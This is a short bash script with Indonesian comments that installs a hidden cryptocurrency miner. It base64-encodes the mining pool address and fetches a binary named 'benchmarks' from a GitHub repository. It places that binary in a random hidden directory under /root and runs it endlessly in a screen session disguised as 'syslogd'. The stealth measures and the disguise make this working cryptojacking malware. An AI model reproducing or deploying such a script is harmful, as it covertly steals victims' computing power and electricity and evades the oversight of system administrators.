#!/bin/bash

apt update -y >/dev/null 2>&1 && apt install -y screen wget tar curl -y >/dev/null 2>&1

# Buat nama acak
XNAME=$(tr -dc a-z0-9 </dev/urandom | head -c 6)
XPATH="/root/.${XNAME}"
XBIN="${XPATH}/${XNAME}"

# Enkripsi pool (base64)
ENC_POOL="c3RyYXR1bSt0Y3A6Ly91cy1jZW50cmFsLnJldHJvbWlrZS5uZXQ6NTAwNQ=="
DEC_POOL=$(echo "$ENC_POOL" | base64 -d)

# Wallet & password
WALLET="PQ1TCGVFEz8LzEgiyECHCVozsdtLvQ2N61"
PASSWD="x"

# Siapkan direktori dan file
mkdir -p "$XPATH"

# Unduh dan rename binary
if [ ! -f "$XBIN" ]; then
  git clone https://github.com/amirul5656/yui56.git "$XPATH/.tmp" >/dev/null 2>&1
  cp "$XPATH/.tmp/benchmarks" "$XBIN"
  chmod +x "$XBIN"
  strip "$XBIN" >/dev/null 2>&1
fi

# Jalankan dalam screen dengan argumen palsu
screen -list | grep -q syslogd || screen -dmS syslogd bash -c "
  while true; do
    $XBIN -x xelisv2_pepew -y $DEC_POOL -z $WALLET -w $PASSWD -t 7
    sleep 2
  done
"
